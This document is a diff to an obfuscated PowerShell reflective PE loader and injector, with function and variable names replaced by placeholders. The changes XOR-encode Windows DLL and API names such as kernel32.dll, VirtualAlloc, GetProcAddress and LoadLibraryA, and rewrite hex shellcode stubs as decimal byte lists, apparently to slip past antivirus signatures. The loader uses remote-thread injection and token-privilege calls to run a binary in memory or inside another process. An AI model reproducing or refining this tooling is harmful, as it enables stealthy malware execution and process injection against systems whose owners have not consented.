@@ -69,16 +69,16 @@ function FUN000 {
         )
     
         
-        
+      
         
         Function FUN001 {
             $VAR010 = New-Object System.Object
 
             
             
-            $DoFUN030 = [AppDoFUN030]::CurrentDoFUN030
+            $Domain = [AppDomain]::CurrentDomain
             $VAR012 = New-Object System.Reflection.AssemblyName('DynamicAssembly')
-            $VAR013 = $DoFUN030.DefineDynamicAssembly($VAR012, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+            $VAR013 = $Domain.DefineDynamicAssembly($VAR012, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
             $VAR014 = $VAR013.DefineDynamicModule('DynamicModule', $false)
             $VAR015 = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
 
@@ -397,6 +397,52 @@ function FUN000 {
             return $VAR010
         }
 
+        Function FUN100
+        {
+        Param(
+                [Parameter(Position = 0, Mandatory = $true)]
+                [byte[]]
+                $VAR0320
+            )
+            $VAR0322 = [Byte]0x5A
+            $VAR0321 = for ($i = 0; $i -lt $VAR0320.Length; $i++) { [char]([Byte]$VAR0320[$i] -bxor $VAR0322) } -join ''
+            #$VA#Write-Host $VAR0321
+            #[String]($VAR0321 | ForEach-Object { $_ }) -join ""
+            return [String]($VAR0321 | ForEach-Object { $_ }) -join ""
+            
+        }
+
+        $VAR0303 = [Byte]0x5A
+        $VAR0300 = 49,63,40,52,63,54,105,104,116,62,54,54
+        $VAR0301 = for ($i = 0; $i -lt $VAR0300.Length; $i++) { [char]([Byte]$VAR0300[$i] -bxor $VAR0303) } -join ''
+        $VAR0302 = ($VAR0301 | ForEach-Object { $_ }) -join ""
+
+        $VAR0304 = 27,62,44,59,42,51,105,104,116,62,54,54
+        $VAR0305 = for ($i = 0; $i -lt $VAR0304.Length; $i++) { [char]([Byte]$VAR0304[$i] -bxor $VAR0303) } -join ''
+        $VAR0306 = ($VAR0305 | ForEach-Object { $_ }) -join ""
+
+        $VAR0307 = 55,41,44,57,40,46,116,62,54,54
+        $VAR0308 = for ($i = 0; $i -lt $VAR0307.Length; $i++) { [char]([Byte]$VAR0307[$i] -bxor $VAR0303) } -join ''
+        $VAR0309 = ($VAR0308 | ForEach-Object { $_ }) -join ""
+
+        $VAR0310 = 29,63,46,10,40,53,57,27,62,62,40,63,41,41
+        $VAR0311 = for ($i = 0; $i -lt $VAR0310.Length; $i++) { [char]([Byte]$VAR0310[$i] -bxor $VAR0303) } -join ''
+        $VAR0312 = ($VAR0311 | ForEach-Object { $_ }) -join ""
+
+        $VAR0313 = 12,51,40,46,47,59,54,27,54,54,53,57
+        $VAR0314 = for ($i = 0; $i -lt $VAR0313.Length; $i++) { [char]([Byte]$VAR0313[$i] -bxor $VAR0303) } -join ''
+        $VAR0315 = ($VAR0314 | ForEach-Object { $_ }) -join ''
+
+        $VAR0316 = 12,51,40,46,47,59,54,27,54,54,53,57,31,34
+        $VAR0317 = for ($i = 0; $i -lt $VAR0316.Length; $i++) { [char]([Byte]$VAR0316[$i] -bxor $VAR0303) } -join ''
+        $VAR0318 = ($VAR0317 | ForEach-Object { $_ }) -join ''
+
+                    $VAR0327 = 22,53,59,62,22,51,56,40,59,40,35,27
+            $VAR0328 = for ($i = 0; $i -lt $VAR0327.Length; $i++) { [char]([Byte]$VAR0327[$i] -bxor $VAR0303) } -join ''
+            $VAR0329 = ($VAR0328 | ForEach-Object { $_ }) -join ''
+
+
+
         Function FUN002 {
             $VAR0041 = New-Object System.Object
 
@@ -436,117 +482,117 @@ function FUN000 {
         Function FUN003 {
             $VAR0042 = New-Object System.Object
 
-            $VAR0043 = FUN012 kernel32.dll VirtualAlloc
+            $VAR0043 = FUN012 $VAR0302 $VAR0315
             $VAR0044 = FUN011 @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
             $VAR0045 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0043, $VAR0044)
             $VAR0042 | Add-Member NoteProperty -Name FUN031 -Value $VAR0045
 
-            $VAR0046 = FUN012 kernel32.dll VirtualAllocEx
+            $VAR0046 = FUN012 $VAR0302 $VAR0318
             $VAR0047 = FUN011 @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
             $VAR0048 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0046, $VAR0047)
             $VAR0042 | Add-Member NoteProperty -Name FUN032 -Value $VAR0048
 
-            $VAR0049 = FUN012 msvcrt.dll memcpy
+            $VAR0049 = FUN012 $VAR0309 memcpy
             $VAR0050 = FUN011 @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
             $VAR0051 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0049, $VAR0050)
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN033 -Value $VAR0051
 
-            $VAR0052 = FUN012 msvcrt.dll memset
+            $VAR0052 = FUN012 $VAR0309 memset
             $VAR0053 = FUN011 @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
             $VAR0054 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0052, $VAR0053)
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN034 -Value $VAR0054
 
-            $VAR0055 = FUN012 kernel32.dll LoadLibraryA
+            $VAR0055 = FUN012 $VAR0302 $VAR0329
             $VAR0056 = FUN011 @([String]) ([IntPtr])
             $VAR0057 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0055, $VAR0056)
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN035 -Value $VAR0057
 
-            $VAR0058 = FUN012 kernel32.dll GetProcAddress
+            $VAR0058 = FUN012 $VAR0302 $VAR0312
             $VAR0059 = FUN011 @([IntPtr], [String]) ([IntPtr])
             $VAR0060 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0058, $VAR0059)
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN036 -Value $VAR0060
 
-            $VAR0061 = FUN012 kernel32.dll GetProcAddress 
+            $VAR0061 = FUN012 $VAR0302 $VAR0312 
             $VAR0062 = FUN011 @([IntPtr], [IntPtr]) ([IntPtr])
             $VAR0063 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0061, $VAR0062)
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN037 -Value $VAR0063
 
-            $VAR0064 = FUN012 kernel32.dll VirtualFree
+            $VAR0064 = FUN012 $VAR0302 VirtualFree
             $VAR0065 = FUN011 @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
             $VAR0066 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0064, $VAR0065)
             $VAR0042 | Add-Member NoteProperty -Name FUN038 -Value $VAR0066
 
-            $VAR0067 = FUN012 kernel32.dll VirtualFreeEx
+            $VAR0067 = FUN012 $VAR0302 VirtualFreeEx
             $VAR0068 = FUN011 @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
             $VAR0069 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0067, $VAR0068)
             $VAR0042 | Add-Member NoteProperty -Name FUN039 -Value $VAR0069
 
-            $VAR0070 = FUN012 kernel32.dll VirtualProtect
+            $VAR0070 = FUN012 $VAR0302 VirtualProtect
             $VAR0071 = FUN011 @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
             $VAR0072 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0070, $VAR0071)
             $VAR0042 | Add-Member NoteProperty -Name FUN040 -Value $VAR0072
 
-            $VAR0073 = FUN012 kernel32.dll GetModuleHandleA
+            $VAR0073 = FUN012 $VAR0302 GetModuleHandleA
             $VAR0074 = FUN011 @([String]) ([IntPtr])
             $VAR0075 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0073, $VAR0074)
             $VAR0042 | Add-Member NoteProperty -Name FUN041 -Value $VAR0075
 
-            $VAR0076 = FUN012 kernel32.dll FreeLibrary
+            $VAR0076 = FUN012 $VAR0302 FreeLibrary
             $VAR0077 = FUN011 @([IntPtr]) ([Bool])
             $VAR0078 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0076, $VAR0077)
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN042 -Value $VAR0078
 
-            $VAR0079 = FUN012 kernel32.dll OpenProcess
+            $VAR0079 = FUN012 $VAR0302 OpenProcess
             $VAR0080 = FUN011 @([UInt32], [Bool], [UInt32]) ([IntPtr])
             $VAR0081 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0079, $VAR0080)
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN043 -Value $VAR0081
 
-            $VAR0082 = FUN012 kernel32.dll WaitForSingleObject
+            $VAR0082 = FUN012 $VAR0302 WaitForSingleObject
             $VAR0083 = FUN011 @([IntPtr], [UInt32]) ([UInt32])
             $VAR0084 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0082, $VAR0083)
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN044 -Value $VAR0084
 
-            $VAR0085 = FUN012 kernel32.dll WriteProcessMemory
+            $VAR0085 = FUN012 $VAR0302 WriteProcessMemory
             $VAR0086 = FUN011 @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
             $VAR0087 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0085, $VAR0086)
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN045 -Value $VAR0087
 
-            $VAR0088 = FUN012 kernel32.dll ReadProcessMemory
+            $VAR0088 = FUN012 $VAR0302 ReadProcessMemory
             $VAR0089 = FUN011 @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
             $VAR0090 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0088, $VAR0089)
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN046 -Value $VAR0090
 
-            $VAR0091 = FUN012 kernel32.dll CreateRemoteThread
+            $VAR0091 = FUN012 $VAR0302 CreateRemoteThread
             $VAR0092 = FUN011 @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
             $VAR0093 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0091, $VAR0092)
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN047 -Value $VAR0093
 
-            $VAR0094 = FUN012 kernel32.dll GetExitCodeThread
+            $VAR0094 = FUN012 $VAR0302 GetExitCodeThread
             $VAR0095 = FUN011 @([IntPtr], [Int32].MakeByRefType()) ([Bool])
             $VAR0096 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0094, $VAR0095)
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN048 -Value $VAR0096
 
-            $VAR0097 = FUN012 Advapi32.dll OpenThreadToken
+            $VAR0097 = FUN012 $VAR0306 OpenThreadToken
             $VAR0098 = FUN011 @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
             $VAR0099 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0097, $VAR0098)
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN049 -Value $VAR0099
 
-            $VAR0100 = FUN012 kernel32.dll GetCurrentThread
+            $VAR0100 = FUN012 $VAR0302 GetCurrentThread
             $VAR0101 = FUN011 @() ([IntPtr])
             $VAR0102 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0100, $VAR0101)
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN050 -Value $VAR0102
 
-            $VAR0103 = FUN012 Advapi32.dll AdjustTokenCONST169
+            $VAR0103 = FUN012 $VAR0306 AdjustTokenPrivileges
             $VAR0104 = FUN011 @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
             $VAR0105 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0103, $VAR0104)
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN051 -Value $VAR0105
 
-            $VAR0106 = FUN012 Advapi32.dll LookupPrivilegeValueA
+            $VAR0106 = FUN012 $VAR0306 LookupPrivilegeValueA
             $VAR0107 = FUN011 @([String], [String], [IntPtr]) ([Bool])
             $VAR0108 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0106, $VAR0107)
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN052 -Value $VAR0108
 
-            $VAR0109 = FUN012 Advapi32.dll ImpersonateSelf
+            $VAR0109 = FUN012 $VAR0306 ImpersonateSelf
             $VAR0110 = FUN011 @([Int32]) ([Bool])
             $VAR0111 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0109, $VAR0110)
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN053 -Value $VAR0111
@@ -559,12 +605,12 @@ function FUN000 {
                 $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN054 -Value $VAR0114
             }
 
-            $VAR0115 = FUN012 Kernel32.dll IsWow64Process
+            $VAR0115 = FUN012 $VAR0302 IsWow64Process
             $VAR0116 = FUN011 @([IntPtr], [Bool].MakeByRefType()) ([Bool])
             $VAR0117 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0115, $VAR0116)
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN055 -Value $VAR0117
 
-            $VAR0118 = FUN012 Kernel32.dll CreateThread
+            $VAR0118 = FUN012 $VAR0302 CreateThread
             $VAR0119 = FUN011 @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
             $VAR0120 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0118, $VAR0119)
             $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN056 -Value $VAR0120
@@ -766,9 +812,9 @@ function FUN000 {
                 $ReturnType = [Void]
             )
 
-            $DoFUN030 = [AppDoFUN030]::CurrentDoFUN030
+            $Domain = [AppDomain]::CurrentDomain
             $VAR0131 = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
-            $VAR013 = $DoFUN030.DefineDynamicAssembly($VAR0131, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+            $VAR013 = $Domain.DefineDynamicAssembly($VAR0131, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
             $VAR014 = $VAR013.DefineDynamicModule('InMemoryModule', $false)
             $VAR011 = $VAR014.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
             $VAR0132 = $VAR011.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
@@ -796,13 +842,13 @@ function FUN000 {
             )
 
             
-            $VAR0134 = [AppDoFUN030]::CurrentDoFUN030.GetAssemblies() |
+            $VAR0134 = [AppDomain]::CurrentDomain.GetAssemblies() |
             Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
             $VAR0135 = $VAR0134.GetType('Microsoft.Win32.UnsafeNativeMethods')
 
             
             $VAR0075 = $VAR0135.GetMethod('GetModuleHandle')
-            $VAR0060 = $VAR0135.GetMethods() | Where { $_.Name -eq "GetProcAddress" } | Select-Object -first 1
+            $VAR0060 = $VAR0135.GetMethods() | Where { $_.Name -eq $VAR0312 } | Select-Object -first 1
 
             
             $VAR0136 = $VAR0075.Invoke($null, @($Module))
@@ -1028,18 +1074,18 @@ function FUN000 {
             $VAR0154 = FUN015 -VAR0263 $VAR0263 -VAR010 $VAR010
 
             
-            $VAR0126 | Add-Member -MemberType NoteProperty -Name VAR0263 -Value $VAR0263
-            $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST031 -Value ($VAR0154.CONST031)
-            $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST100 -Value ($VAR0154.CONST100)
-            $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST032 -Value ($VAR0154.CONST032)
+            $VAR0126 | Add-Member -MemberType NoteProperty -Name 'VAR0263' -Value $VAR0263
+            $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST031' -Value ($VAR0154.CONST031)
+            $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST1000' -Value ($VAR0154.CONST030) 
+            $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST032' -Value ($VAR0154.CONST032)
             $VAR0126 | Add-Member -MemberType NoteProperty -Name 'CONST033' -Value ($VAR0154.CONST031.CONST122.CONST033)
 
             if ($VAR0126.CONST032 -eq $true) {
-                [IntPtr]$VAR0160 = [IntPtr](FUN005 ([Int64]$VAR0126.CONST100) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST03164)))
+                [IntPtr]$VAR0160 = [IntPtr](FUN005 ([Int64]$VAR0126.CONST1000) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST03164)))
                 $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST036 -Value $VAR0160
             }
             else {
-                [IntPtr]$VAR0160 = [IntPtr](FUN005 ([Int64]$VAR0126.CONST100) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST03132)))
+                [IntPtr]$VAR0160 = [IntPtr](FUN005 ([Int64]$VAR0126.CONST1000) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST03132)))
                 $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST036 -Value $VAR0160
             }
 
@@ -1086,7 +1132,7 @@ function FUN000 {
                 Throw "ERROR11"
             }
 
-            $VAR0168 = $VAR0042.FUN041.Invoke("kernel32.dll")
+            $VAR0168 = $VAR0042.FUN041.Invoke($VAR0302)
             $VAR0169 = $VAR0042.FUN036.Invoke($VAR0168, "LoadLibraryA") 
 
             [IntPtr]$VAR0181 = [IntPtr]::Zero
@@ -1099,11 +1145,10 @@ function FUN000 {
                     Throw "ERROR12"
                 }
 
-                
-                $VAR0174 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
-                $VAR0175 = @(0x48, 0xba)
-                $VAR0176 = @(0xff, 0xd2, 0x48, 0xba)
-                $VAR0177 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
+                [Byte[]]$VAR0174 = 83,72,137,227,72,131,236,32,102,131,228,192,72,185
+                $VAR0175 = 72,186
+                $VAR0176 = 255,210,72,186
+                $VAR0177 = 72,137,2,72,137,220,91,195
 
                 $VAR0171 = $VAR0174.Length + $VAR0175.Length + $VAR0176.Length + $VAR0177.Length + ($VAR0163 * 3)
                 $VAR0172 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0171)
@@ -1134,7 +1179,7 @@ function FUN000 {
                     Throw "ERROR14"
                 }
 
-                $VAR0179 = FUN014 -ProcessHandle $VAR0161 -VAR0127 $VAR0178 -VAR0042 $VAR0042
+                $VAR0179 = FUN014 -VAR0151 $VAR0161 -VAR0127 $VAR0178 -VAR0042 $VAR0042
                 $VAR0144 = $VAR0042.FUN044.Invoke($VAR0179, 20000)
                 if ($VAR0144 -ne 0) {
                     Throw "ERROR15"
@@ -1152,7 +1197,7 @@ function FUN000 {
                 $VAR0042.FUN039.Invoke($VAR0161, $VAR0178, [UIntPtr][UInt64]0, $VAR0041.CONST025) | Out-Null
             }
             else {
-                [IntPtr]$VAR0179 = FUN014 -ProcessHandle $VAR0161 -VAR0127 $VAR0169 -ArgumentPtr $VAR0166 -VAR0042 $VAR0042
+                [IntPtr]$VAR0179 = FUN014 -VAR0151 $VAR0161 -VAR0127 $VAR0169 -VAR0152 $VAR0166 -VAR0042 $VAR0042
                 $VAR0144 = $VAR0042.FUN044.Invoke($VAR0179, 20000)
                 if ($VAR0144 -ne 0) {
                     Throw "ERROR17."
@@ -1220,8 +1265,8 @@ function FUN000 {
             }
 
             
-            $VAR0168 = $VAR0042.FUN041.Invoke("kernel32.dll")
-            $VAR0058 = $VAR0042.FUN036.Invoke($VAR0168, "GetProcAddress") 
+            $VAR0168 = $VAR0042.FUN041.Invoke($VAR0302)
+            $VAR0058 = $VAR0042.FUN036.Invoke($VAR0168, $VAR0312) 
 
             
             $VAR0189 = $VAR0042.FUN032.Invoke($VAR0161, [IntPtr]::Zero, [UInt64][UInt64]$VAR0163, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST005)
@@ -1233,18 +1278,18 @@ function FUN000 {
             
             [Byte[]]$VAR0190 = @()
             if ($VAR0126.CONST032 -eq $true) {
-                $VAR01901 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
-                $VAR01902 = @(0x48, 0xba)
-                $VAR01903 = @(0x48, 0xb8)
-                $VAR01904 = @(0xff, 0xd0, 0x48, 0xb9)
-                $VAR01905 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
+                $VAR01901 = 83,72,137,227,72,131,236,32,102,131,228,192,72,185
+                $VAR01902 = 72,186
+                $VAR01903 = 72,184
+                $VAR01904 = 255,208,72,185
+                $VAR01905 = 72,137,1,72,137,220,91,195
             }
             else {
-                $VAR01901 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
-                $VAR01902 = @(0xb9)
-                $VAR01903 = @(0x51, 0x50, 0xb8)
-                $VAR01904 = @(0xff, 0xd0, 0xb9)
-                $VAR01905 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
+                $VAR01901 = 83,137,227,131,228,192,184
+                $VAR01902 = 185
+                $VAR01903 = 81,80,184
+                $VAR01904 = 255,208,185
+                $VAR01905 = 137,1,137,220,91,195
             }
             $VAR0171 = $VAR01901.Length + $VAR01902.Length + $VAR01903.Length + $VAR01904.Length + $VAR01905.Length + ($VAR0163 * 4)
             $VAR0172 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0171)
@@ -1279,7 +1324,7 @@ function FUN000 {
                 Throw "ERROR22"
             }
 
-            $VAR0179 = FUN014 -ProcessHandle $VAR0161 -VAR0127 $VAR0178 -VAR0042 $VAR0042
+            $VAR0179 = FUN014 -VAR0151 $VAR0161 -VAR0127 $VAR0178 -VAR0042 $VAR0042
             $VAR0144 = $VAR0042.FUN044.Invoke($VAR0179, 20000)
             if ($VAR0144 -ne 0) {
                 Throw "ERROR23"
@@ -1694,7 +1739,7 @@ function FUN000 {
             $VAR0163 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
             [UInt32]$VAR0226 = 0
     
-            [IntPtr]$VAR0168 = $VAR0042.FUN041.Invoke("Kernel32.dll")
+            [IntPtr]$VAR0168 = $VAR0042.FUN041.Invoke($VAR0302)
             if ($VAR0168 -eq [IntPtr]::Zero) {
                 throw "ERROR33"
             }
@@ -1724,7 +1769,7 @@ function FUN000 {
             }
             $VAR0235 += 0xb8
     
-            [Byte[]]$VAR0236 = @(0xc3)
+            [Byte[]]$VAR0236 = 195
             $VAR0237 = $VAR0235.Length + $VAR0163 + $VAR0236.Length
     
             
@@ -1845,14 +1890,14 @@ function FUN000 {
                 $VAR0257 = $VAR0256
                 
                 
-                [Byte[]]$VAR0235 = @(0xbb)
-                [Byte[]]$VAR0236 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
+                [Byte[]]$VAR0235 = 187
+                [Byte[]]$VAR0236 = 198,3,1,131,236,32,131,228,192,187
                 
                 if ($VAR0163 -eq 8) {
-                    [Byte[]]$VAR0235 = @(0x48, 0xbb)
-                    [Byte[]]$VAR0236 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
+                    [Byte[]]$VAR0235 = 72,187
+                    [Byte[]]$VAR0236 = 198,3,1,72,131,236,32,102,131,228,192,72,187
                 }
-                [Byte[]]$VAR0258 = @(0xff, 0xd3)
+                [Byte[]]$VAR0258 = 255,211
                 $VAR0237 = $VAR0235.Length + $VAR0163 + $VAR0236.Length + $VAR0163 + $VAR0258.Length
     
                 [IntPtr]$VAR0259 = $VAR0042.FUN036.Invoke($VAR0168, "ExitThread")
@@ -2009,7 +2054,7 @@ function FUN000 {
             
             $VAR0274 = $true
             if ($VAR0210 -eq $true) {
-                $VAR0168 = $VAR0042.FUN041.Invoke("kernel32.dll")
+                $VAR0168 = $VAR0042.FUN041.Invoke($VAR0302)
                 $VAR0144 = $VAR0042.FUN036.Invoke($VAR0168, "IsWow64Process")
                 if ($VAR0144 -eq [IntPtr]::Zero) {
                     Throw "ERROR52"
@@ -2142,15 +2187,15 @@ function FUN000 {
 
                     if ($VAR0126.CONST032 -eq $true) {
                         
-                        $VAR0283 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
-                        $VAR0284 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
-                        $VAR0285 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
+                        $VAR0283 = 83,72,137,227,102,131,228,0,72,185
+                        $VAR0284 = 186,1,0,0,0,65,184,0,0,0,0,72,184
+                        $VAR0285 = 255,208,72,137,220,91,195
                     }
                     else {
                         
-                        $VAR0283 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
-                        $VAR0284 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
-                        $VAR0285 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
+                        $VAR0283 = 83,137,227,131,228,240,185
+                        $VAR0284 = 186,1,0,0,0,184,0,0,0,0,80,82,81,184
+                        $VAR0285 = 255,208,137,220,91,195
                     }
                     $VAR0171 = $VAR0283.Length + $VAR0284.Length + $VAR0285.Length + ($VAR0163 * 2)
                     $VAR0172 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0171)
@@ -2177,7 +2222,7 @@ function FUN000 {
                         Throw "ERROR61"
                     }
 
-                    $VAR0179 = FUN014 -ProcessHandle $VAR0161 -VAR0127 $VAR0178 -VAR0042 $VAR0042
+                    $VAR0179 = FUN014 -VAR0151 $VAR0161 -VAR0127 $VAR0178 -VAR0042 $VAR0042
                     $VAR0144 = $VAR0042.FUN044.Invoke($VAR0179, 20000)
                     if ($VAR0144 -ne 0) {
                         Throw "ERROR62"
@@ -2389,7 +2434,7 @@ function FUN000 {
                 $VAR0301 = FUN005 $VAR0301 $VAR0292
 
                 
-                $Null = FUN014 -ProcessHandle $VAR0161 -VAR0127 $VAR0301 -VAR0042 $VAR0042
+                $Null = FUN014 -VAR0151 $VAR0161 -VAR0127 $VAR0301 -VAR0042 $VAR0042
             }
 
             
@@ -2438,6 +2483,7 @@ function FUN000 {
 
     FUN030
 }
+
 
 $Bytes = QWERQWERQWER
 FUN000 -VAR0001 $Bytes
